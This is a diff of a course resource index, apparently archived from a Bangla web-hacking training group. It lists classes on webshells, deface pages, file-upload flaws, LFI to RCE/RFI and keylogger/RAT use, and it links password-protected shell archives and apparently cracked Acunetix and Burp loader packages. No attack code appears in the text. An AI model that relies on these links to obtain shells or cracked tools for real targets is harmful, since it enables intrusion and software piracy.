-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-100
 
 WebShell / Backdoor concept & deface page making
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632339608468628
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632339608468628)
 
-## entry-101 · up_shell_fight
+## up_shell_fight
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-101
 
 up_shell_fight
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632440608458528
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632440608458528)
 
-## entry-102 · Upload vulnerability
+## Upload vulnerability
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-102
 
 Upload vulnerability
 0:00 / 0:00
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1632429668459622
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429668459622)
 
-## entry-103 · Webshell-B.pdf
+## Webshell-B.pdf
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-103
 
 PDF
 Webshell-B.pdf
 
-Own document copy: /documents/webshell-b.pdf
+- [Resource](/documents/webshell-b.pdf)
 
-## entry-104 · Advance WebShell
+## Advance WebShell
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-104
 
 Advance WebShell
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1634028824966373
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634028824966373)
 
-## entry-106 · Advanced Shell Resource
+## Advanced Shell Resource
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-106
 
 Advanced Shell Resource
 Shell file password: aws
@@ -2667,197 +2485,174 @@ Video resource:
 part-1: https://drive.google.com/.../1aPft3a16Ue.../view
 part-2: https://drive.google.com/.../1WSWH50J_GD8HTeh.../view
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1634198088282780
+- [ShellTC.rar](https://drive.google.com/file/d/1CVU48B_PTjiLMpNUzX4dLXmWfejc0_D8/view)
+- [Asif_Shell_Part1.mp4](https://drive.google.com/file/d/1DSSNWtalcz8Tuenlk-RRxneBkDG7Yvz-/view)
+- [Asif_Shell_part2.mp4](https://drive.google.com/file/d/1wwdj8VHlfqQeYgMy72Gev0L16jh22Vsl/view)
+- [Resource](https://drive.google.com/file/d/1Pm2LR1Zg3bI4vDCenjuAsc6X9HWDYcH8/view)
+- [Resource](https://drive.google.com/file/d/1aPft3a16Ue-aFuY2pTNXvlSAv6Hsw2Ac/view)
+- [Resource](https://drive.google.com/file/d/1WSWH50J_GD8HTeh-UsAuybJg9kRml141/view)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634198088282780)
 
-## entry-108 · Files Uploading Vulnerabilities.pdf
+## Files Uploading Vulnerabilities.pdf
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-108
 
 PDF
 Files Uploading Vulnerabilities.pdf
 
-Own document copy: /documents/files-uploading-vulnerabilities.pdf
+- [Resource](/documents/files-uploading-vulnerabilities.pdf)
 
-## entry-109 · FileUV.pdf
+## FileUV.pdf
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-109
 
 PDF
 FileUV.pdf
 
-Own document copy: /documents/fileuv.pdf
+- [Resource](/documents/fileuv.pdf)
 
-## entry-110 · Portswigger
+## Portswigger
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-110
 
 Portswigger
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1638333177869271
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1638333177869271)
 
-## entry-111 · Deepseek SSRF --BUT sandbox :(
+## Deepseek SSRF --BUT sandbox :(
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-111
 
 Deepseek SSRF --BUT sandbox :(
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1634471391588783
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634471391588783)
 
-## entry-113 · Acunetix resource file
+## Acunetix resource file
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-113
 
 Acunetix resource file
 drive.google.com
 Acunetix-v24.1-Windows.rar
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1640097204359535
+- [Acunetix-v24.1-Windows.rar](https://drive.google.com/file/d/1fD5bqJjgQm1G2B2_FbMMKvdOwOeb6ahL/view)
+- [Resource](https://drive.google.com/file/d/1_qMh5E_NC1cA-i7aJ2QjRfbvgcx5rDaZ/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1640097204359535)
 
-## entry-114 · Acunetix
+## Acunetix
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-114
 
 Acunetix
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1640006177701971
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1640006177701971)
 
-## entry-116 · Linux Installation & Virtual Lab Setup
+## Linux Installation & Virtual Lab Setup
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-116
 
 Linux Installation & Virtual Lab Setup
 0:00 / 1:58:03
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1645991267103462
+- [Resource](https://www.facebook.com/khaleddevsec/videos/2311014589647758/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1645991267103462)
 
-## entry-118 · Batch Scripting Resource
+## Batch Scripting Resource
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-118
 
 Batch Scripting Resource
 PDF
 Batch_Scripting_Short_Notes.pdf
 
-Own document copy: /documents/batch-scripting-short-notes.pdf
+- [Resource](/documents/batch-scripting-short-notes.pdf)
 
-## entry-119 · Batch Scripting
+## Batch Scripting
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-119
 
 Batch Scripting
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1644256053943650
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1644256053943650)
 
-## entry-120 · Linux installation in VMware
+## Linux installation in VMware
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-120
 
 Linux installation in VMware
 https://drive.google.com/file/d/1LwowKtmXfIXpDbz4UvgG1-QAoxrSkbAn/view?usp=sharing
 drive.google.com
 vmware-setup.mp4
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1646665933702662
+- [Resource](https://drive.google.com/file/d/1LwowKtmXfIXpDbz4UvgG1-QAoxrSkbAn/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646665933702662)
 
-## entry-123 · Topic: Keylogger, Spyware & RAT (Live/Practical)
+## Topic: Keylogger, Spyware & RAT (Live/Practical)
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-123
 
 Topic: Keylogger, Spyware & RAT (Live/Practical)
-Class link : https://meet.google.com/zjw-jsqq-oju
+Class link : [মিটিং লিংক প্রকাশ করা হয়নি]
 Class topic will start 9:45 PM
 @everyone
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1651981633171092
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1651981633171092)
 
-## entry-125 · Linux CLI & Fundamental
+## Linux CLI & Fundamental
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: 2026-09-11 · Category: classes · ID: entry-125
 
 Linux CLI & Fundamental
 0:00 / 2:09:22
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1650292053340050
+- [Resource](https://www.facebook.com/sahmsec/videos/2119205895669030/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1650292053340050)
 
-## entry-127 · What is Crypter Antivirus & Virus.pdf
+## What is Crypter Antivirus & Virus.pdf
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-127
 
 PDF
 What is Crypter Antivirus & Virus.pdf
 
-Own document copy: /documents/crypter-antivirus-virus.pdf
+- [Resource](/documents/crypter-antivirus-virus.pdf)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1652083599827562)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1652083599827562
+## Local File Inclusion (LFI)
 
-## entry-128 · Local File Inclusion (LFI)
-
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: 2026-09-18 · Category: classes · ID: entry-128
 
 Local File Inclusion (LFI)
 0:00 / 2:17:15
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1656289636073625
+- [Resource](https://www.facebook.com/S4MC71/videos/944493894821037/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656289636073625)
 
-## entry-129 · Linux Tools & Environment Setup, Burp in kali
+## Linux Tools & Environment Setup, Burp in kali
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: 2026-09-20 · Category: classes · ID: entry-129
 
 Linux Tools & Environment Setup, Burp in kali
 0:00 / 2:16:45
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1657993995903189
+- [Resource](https://www.facebook.com/sahmsec/videos/1504289691484713/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1657993995903189)
 
-## entry-131 · Local File Inclusion Vulnerability(Lfi):
+## Local File Inclusion Vulnerability(Lfi):
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-131
 
 Local File Inclusion Vulnerability(Lfi):
 নিয়ে কিছু বলার আগে ছোট করে বলে দেই - আগে আমরা ওয়েব সাইটের ভার্নাবেলিটি থেকে ওয়েবসাইটের তথ্য বের করেছি বা ওয়েবসাইট এক্সেস কিংবা হ্যাক করেছি। এই পার্টে আমরা দেখবো ওয়েবসাইটের ভার্নাভেলিটির মাধ্যমে ওয়েব সার্ভারের গুরুত্বপূর্ণ তথ্য বের করা। এবং তাতে এমন ও হতে পারে আমরা ওয়েব এপ্লিকেশন সিস্টেমের গোটা সার্ভার নিয়ন্ত্রণে নিয়ে নিতে পারি।
 PDF
 Web Server.pdf
 
-Own document copy: /documents/web-server.pdf
+- [Resource](/documents/web-server.pdf)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656475676055021)
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1656475676055021
+## আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
 
-## entry-133 · আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
-
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-133
 
 #happy_support_day
 আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
@@ -2865,106 +2660,95 @@ Meet-এ যোগদানের তথ্য:
 সময়:
 প্রথম সেশন: সন্ধ্যা ৭:১৫ টা থেকে রাত ৯ টা পর্যন্ত
 দ্বিতীয় সেশন: রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক: https://meet.google.com/fii-gaqn-vwb
-Or dial: (US) +1 678-632-3967 PIN: 222 850 200#
+লিঙ্ক: [মিটিং লিংক প্রকাশ করা হয়নি]
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 কিভাবে সাহায্য পাবেন: আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
 ধন্যবাদ।
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1658753369160585
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1658753369160585)
 
-## entry-135 · Java & Go commands:
+## Java & Go commands:
 
-Category: documents | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: documents · ID: entry-135
 
 Java & Go commands:
 PDF
 java&go commands.pdf
 
-Own document copy: /documents/java-go-commands.pdf
+- [Resource](/documents/java-go-commands.pdf)
 
-## entry-136 · Burploader resource:
+## Burploader resource:
 
-Category: tools | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: tools · ID: entry-136
 
 Burploader resource:
 
-## entry-137 · LFI to Rce Final
+- [burploader-source.zip](https://drive.google.com/file/d/15P0WvfiBNKYdf8rVFul1wwiknBk3d5Ee/view)
+- [Resource](https://github.com/sahmsec/burploader)
 
-Category: classes | Date: not verified
+## LFI to Rce Final
 
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-137
 
 youtube.com
 LFI to Rce Final
 
-Verified video: https://youtu.be/5MQFCI1a9uQ
+- [Resource](https://youtu.be/5MQFCI1a9uQ)
 
-## entry-138 · LFI — Not acceptable bypass
+## LFI — Not acceptable bypass
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-138
 
 https://youtu.be/fobeXDPJZdk
 youtube.com
 LFI (not acceptable bypass)
 
-Verified video: https://youtu.be/fobeXDPJZdk
+- [Resource](https://youtu.be/fobeXDPJZdk)
 
-## entry-139 · Advance LFI to RCE
+## Advance LFI to RCE
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: 2026-09-25 · Category: classes · ID: entry-139
 
 Advance LFI to RCE
 0:00 / 0:00
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1662445735458015
+- [Resource](https://www.facebook.com/XploitAsh.sh/videos/2585418491898562/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1662445735458015)
 
-## entry-140 · Topic: "Web hosting Concept & Wordpress"
+## Topic: "Web hosting Concept & Wordpress"
 
-Category: information | Date: 2026-09-27
-
-### Preserved post text
+Date: 2026-09-27 · Category: information · ID: entry-140
 
 Topic: "Web hosting Concept & Wordpress"
-Class link : https://meet.google.com/vnq-bmay-ntv
+Class link : [মিটিং লিংক প্রকাশ করা হয়নি]
 Class topic will start 9:45 PM
 @everyone
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1664387545263834
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1664387545263834)
 
-## entry-141 · LFI to RFI
+## LFI to RFI
 
-Category: classes | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: classes · ID: entry-141
 
 LFI to RFI
 0:00 / 0:00
 
-## entry-143 · Recon Part 1
 
-Category: classes | Date: not verified
+## Recon Part 1
 
-### Preserved post text
+Date: 2026-10-02 · Category: classes · ID: entry-143
 
 Join Class @everyone
 https://www.facebook.com/S4MC71/videos/976877741338543/?idorvanity=1598186498550606
 Recon Part 1
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1669334581435797
+- [Resource](https://www.facebook.com/S4MC71/videos/976877741338543/)
+- [Resource](https://www.facebook.com/groups/awsb66delta/)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1669334581435797)
 
-## entry-144 · আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
+## আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-144
 
 আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
 Meet-এ যোগদানের তথ্য:
@@ -2974,31 +2758,163 @@ Meet-এ যোগদানের তথ্য:
 দ্বিতীয় সেশন:
 রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
 লিঙ্ক:
-https://meet.google.com/fii-gaqn-vwb
-Or dial: (US) +1 678-632-3967 PIN: 222 850 200#
+[মিটিং লিংক প্রকাশ করা হয়নি]
+[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
 কিভাবে সাহায্য পাবেন:
 আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
 ধন্যবাদ।
 meet.google.com
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1665357758500146
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1665357758500146)
 
-## entry-146 · LFI to RFI
+## LFI to RFI
 
-Category: information | Date: not verified
-
-### Preserved post text
+Date: unverified · Category: information · ID: entry-146
 
 LFI to RFI
 
-## entry-148 · WordPress Backup, XAMPP ও phpMyAdmin
 
-Category: recordings | Date: 2026-10-04
+## Class 22 — WordPress Backup, Wordfence Malware Scan ও XAMPP Lab
 
-### Preserved post text
+Date: 2026-10-04 · Category: recordings · ID: entry-148
 
 ক্লাস রেকর্ড
 ০৪/১০/২০২৬
 12E9FMcDqORPKk_G6SWH5EbGU_PS8eyU2
 
-Original source: https://www.facebook.com/groups/awsb66delta/posts/1671359777899944
+- [Resource](https://drive.google.com/file/d/12E9FMcDqORPKk_G6SWH5EbGU_PS8eyU2/view?usp=sharing)
+- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1671359777899944)
+
+## XSS — Homework Task 5 (HW5.pdf)
+
+Date: 2026-08-09 · Category: documents · ID: msg-hw5-xss
+
+Messenger-এ দেওয়া XSS homework। ক্লাস ৬-এর Cross Site Scripting বিষয়ের সঙ্গে যুক্ত। Homework Task 5 ফাইলের নাম; এটি ক্লাসের সিরিয়াল নয়।
+পাবলিক কপিতে স্ক্রিনশটের session cookie মানগুলো মুছে দেওয়া হয়েছে। মূল প্রশ্ন ও উদাহরণ অক্ষত আছে। অনুশীলন কেবল নিজস্ব বা অনুমতিপ্রাপ্ত ল্যাবে করুন।
+
+- [hw5-xss-public.pdf](/documents/hw5-xss-public.pdf)
+
+## Deface Page — HTML অনুশীলন ফাইল
+
+Date: 2026-08-21 · Category: documents · ID: msg-deface-example
+
+Messenger-এর deface.html ফাইলটি মূল অবস্থায় ZIP-এর মধ্যে সংরক্ষিত। ক্লাস ৯-এর WebShell, Backdoor ও Deface Page বিষয়ের সঙ্গে যুক্ত।
+ZIP-এ original HTML ও README আছে। HTML-এ বাহ্যিক রিসোর্স এবং স্থানীয় ছবি-পাথ আছে; নিজের ল্যাবে ব্যবহারের আগে source দেখুন।
+
+- [deface-class-example.zip](/documents/deface-class-example.zip)
+
+## WordPress Backup — All-in-One WP Migration 7.48
+
+Date: 2026-10-04 · Category: tools · ID: msg-wp-migration
+
+ক্লাস ২২-এর WordPress backup/migration বিষয়ের সঙ্গে সম্পর্কিত Messenger-এর migration ফোল্ডারের ফাইল। মূল ZIP এবং ভেতরের লাইসেন্স অক্ষত রেখে সংরক্ষণ করা হয়েছে।
+এটি কোর্সে দেওয়া পুরোনো 7.48 সংস্করণ; অনুশীলনের স্থানীয় ল্যাবের জন্য সংরক্ষিত। নতুন বা চলমান সাইটে ব্যবহারের আগে বর্তমান সংস্করণ ও compatibility যাচাই করুন।
+ব্যবহার: WordPress dashboard → Plugins → Add New → Upload Plugin-এ ZIP নির্বাচন করুন। Backup/export ও import-এর জন্য All-in-One WP Migration মেনু ব্যবহার করুন।
+একই ফোল্ডারের Unlimited Extension পুনর্বিতরণের অনুমতি দেয় না, তাই তার ZIP প্রকাশ করা হয়নি। কোর্সের Duplicator Pro ZIP-এ activation-state পরিবর্তন পাওয়া গেছে; সেটি চালানো বা প্রকাশ করা হয়নি। অফিসিয়াল Duplicator Lite বিকল্প আলাদা রিসোর্সে আছে।
+
+- [all-in-one-wp-migration.zip](/tools/all-in-one-wp-migration-7.48.zip)
+- [Resource](https://servmask.com/products)
+
+## Wordfence 9.0.2 — WordPress Security Scan
+
+Date: unverified · Category: tools · ID: tool-wordfence
+
+ক্লাস ২২: ৭১:০০ মিনিটে Wordfence 9.0.2 ইনস্টল; ৭৫:০০–৮৩:০০ মিনিটে Standard scan।
+সেটআপ: WordPress → Plugins → Add New → Upload Plugin-এ ZIP দিন অথবা অফিসিয়াল Wordfence খুঁজুন। Activate করে নিজের সাইটের জন্য নিবন্ধন সম্পন্ন করুন। Wordfence → Scan → Start New Scan।
+ফলাফল ও backup যাচাই ছাড়া কোনো ফাইল মুছবেন না। ZIP ক্লাসে দেখানো সংস্করণের; চলমান সাইটে সর্বশেষ আপডেট ব্যবহার করুন।
+
+- [Wordfence 9.0.2 ZIP ডাউনলোড ↓](https://downloads.wordpress.org/plugin/wordfence.9.0.2.zip)
+- [Resource](https://wordpress.org/plugins/wordfence/)
+
+## WordPress Local Lab — XAMPP ও phpMyAdmin
+
+Date: unverified · Category: tools · ID: tool-wordpress-lab
+
+ক্লাস ২০ ও ২২-এর local lab software। XAMPP-এ Apache, MariaDB, PHP এবং phpMyAdmin থাকে।
+সেটআপ: XAMPP ইনস্টল → Apache/MySQL চালু → htdocs-এর নিজের lab folder-এ WordPress extract → localhost/phpmyadmin-এ database তৈরি → localhost-এ WordPress সেটআপ। Database port ও web server port আলাদা।
+ক্লাস ২২: ৩৭:০০–৩৯:০০ XAMPP/htdocs; ৪১:০০–৫৯:০০ database নিয়ে কাজ। ভিডিওতে WordPress 7.1.2 দেখা যায়; নিচে অফিসিয়াল বর্তমান ZIP। XAMPP installer ও Control Panel-এর version আলাদা।
+
+- [XAMPP 8.2.12 Windows 64-bit installer ↓](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe)
+- [WordPress অফিসিয়াল ZIP ↓](https://wordpress.org/latest.zip)
+- [phpMyAdmin অফিসিয়াল ডাউনলোড ↗](https://www.phpmyadmin.net/downloads/)
+- [Resource](https://www.apachefriends.org/download.html)
+
+## Elementor — WordPress Page Builder
+
+Date: unverified · Category: tools · ID: tool-elementor
+
+ক্লাস ২০-এর Elementor topic-এর অফিসিয়াল free plugin। Plugins → Add New → Upload Plugin → ZIP দিন → Activate। Pages → Edit with Elementor দিয়ে নিজের lab page সম্পাদনা করুন। এটি Pro package নয়।
+
+- [Elementor 4.3.4 ZIP ডাউনলোড ↓](https://downloads.wordpress.org/plugin/elementor.4.3.4.zip)
+- [Resource](https://wordpress.org/plugins/elementor/)
+
+## Duplicator Lite — অফিসিয়াল Backup বিকল্প
+
+Date: unverified · Category: tools · ID: tool-duplicator-official
+
+ক্লাস ২২-এ Duplicator Pro দেখা যায়। পাওয়া Pro ZIP-এ activation-state পরিবর্তন থাকায় সেটি এখানে বিতরণ করা হয়নি। নিচে অফিসিয়াল free Lite বিকল্প; Lite ও Pro-এর সুবিধা এক নয়।
+সেটআপ: Plugins → Add New → Duplicator খুঁজে Install/Activate। নিজের lab site-এর backup তৈরি করুন। পুনরুদ্ধারের আগে বর্তমান site/database backup রাখুন।
+
+- [Duplicator Lite অফিসিয়াল ডাউনলোড ↗](https://wordpress.org/plugins/duplicator/)
+- [Resource](https://duplicator.com/)
+
+## Burp Suite Community — অফিসিয়াল Setup
+
+Date: unverified · Category: tools · ID: tool-burp-official
+
+ক্লাস ৮-এর Proxy/Intruder, ক্লাস ১১-এর PortSwigger lab ও ক্লাস ১৮-এর Kali/Burp setup-এর জন্য অফিসিয়াল Community বিকল্প। Pro-এর সব সুবিধা এতে নেই।
+নিজের lab-এ Proxy-এর embedded browser দিয়ে শুরু করুন। আলাদা Firefox ব্যবহারে proxy/certificate setup প্রয়োজন। বর্তমান native installer-এ Java runtime থাকে; বর্তমান JAR-এর জন্য Java 21 বা পরের সংস্করণ প্রয়োজন। পুরোনো course version-এর compatibility আলাদা।
+
+- [Burp Suite Community ডাউনলোড ↗](https://portswigger.net/burp/communitydownload)
+- [Java JDK (Temurin) ডাউনলোড ↗](https://adoptium.net/temurin/releases/)
+- [Firefox অফিসিয়াল ডাউনলোড ↗](https://www.mozilla.org/firefox/new/)
+- [Resource](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)
+
+## Kali Linux ও VMware — Virtual Lab Downloads
+
+Date: unverified · Category: tools · ID: tool-linux-official
+
+ক্লাস ১৪-এর virtual lab ও ক্লাস ১৮-এর Kali setup-এর অফিসিয়াল sources। নিজের architecture অনুযায়ী Kali installer/VM image নিন। VMware download-এ Broadcom account ও terms লাগতে পারে; এটি সরাসরি installer mirror নয়। ক্লাসের installation guide Tools ট্যাবেও আছে।
+
+- [Kali Linux অফিসিয়াল ডাউনলোড ↗](https://www.kali.org/get-kali/)
+- [VMware অফিসিয়াল download নির্দেশনা ↗](https://knowledge.broadcom.com/external/article/368667/download-and-license-information-for-vmw.html)
+- [Resource](https://www.kali.org/get-kali/)
+
+## Go, Python ও Git — Recon Prerequisites
+
+Date: unverified · Category: tools · ID: tool-go-recon
+
+ক্লাস ১৮-এর Java/Go নোট ও ক্লাস ২১-এর Recon resource-এর প্রস্তুতির software sources। Go ক্লাস ১৮-এরও বিষয়; Python/Git/curl/wget-এর প্রস্তুতি Recon resource-এ আছে।
+নিজের OS-এর অফিসিয়াল installer নিন। Go/Python/Git version ও Go PATH যাচাই করুন। Python packages-এর জন্য পৃথক environment রাখুন। সব Recon phase শেখানো সম্পূর্ণ হয়েছে এমন দাবি করা হচ্ছে না।
+
+- [Go অফিসিয়াল ডাউনলোড ↗](https://go.dev/dl/)
+- [Python অফিসিয়াল ডাউনলোড ↗](https://www.python.org/downloads/)
+- [Git অফিসিয়াল ডাউনলোড ↗](https://git-scm.com/downloads/)
+- [Resource](https://arenauser.notion.site/Recon-for-Web-Application-bc489086047f4320802b919f0cdeb70e)
+
+## Shodan — Recon Web Tool
+
+Date: unverified · Category: tools · ID: tool-shodan
+
+ক্লাস ২১-এর Shodan topic-এর অফিসিয়াল web tool। আলাদা installer প্রয়োজন নেই। সেবার account/plan অনুযায়ী সুবিধা পাওয়া যায়।
+
+- [Shodan খুলুন ↗](https://www.shodan.io/)
+- [Resource](https://www.shodan.io/)
+
+## OSINT — IP Lookup, WHOIS ও Web Archive
+
+Date: unverified · Category: tools · ID: tool-osint
+
+ক্লাস ৩-এর নোটে থাকা browser-based OSINT resources। আলাদা installer প্রয়োজন নেই। নিজের বা অনুমোদিত বিষয় নিয়ে অনুসন্ধান করুন।
+
+- [IP lookup খুলুন ↗](https://whatismyipaddress.com/ip-lookup)
+- [WHOIS খুলুন ↗](https://whois.domaintools.com/)
+- [Wayback Machine খুলুন ↗](https://web.archive.org/)
+
+## ক্লাস ২২ — Website/Database Practice Files
+
+Date: unverified · Category: tools · ID: tool-class22-lab-files
+
+ভিডিওর ৩৯:০০ মিনিটে website files.zip (প্রায় 782 MB), পরে database import/export দেখা গেছে। একই দিনের Messenger practice files-এর নিরাপদ, ব্যবহারযোগ্য কপি এখনও সংরক্ষণ করা যায়নি। যাচাই করা কপি পাওয়া গেলে এখানে download যুক্ত হবে। বর্তমানে প্রস্তুত download নেই।
+
+
